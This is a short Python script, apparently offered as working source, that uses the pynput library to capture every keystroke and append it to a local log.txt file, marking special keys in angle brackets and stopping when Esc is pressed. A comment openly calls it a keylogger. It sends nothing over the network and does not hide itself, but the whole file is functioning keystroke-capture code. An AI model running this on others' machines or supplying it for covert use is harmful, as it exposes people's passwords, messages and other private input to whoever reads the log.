from pynput import keyboard

def on_press(key):
    try:
        key_char = key.char
        with open('log.txt', 'a') as file:
            file.write(key_char + '\n')
    except AttributeError:
        # Special key encountered, add it to the log file
        key_name = str(key).replace("Key.", "<") + ">"
        with open('log.txt', 'a') as file:
            file.write(key_name + '\n')

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener on pressing the 'esc' key
        return False

# Start the keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
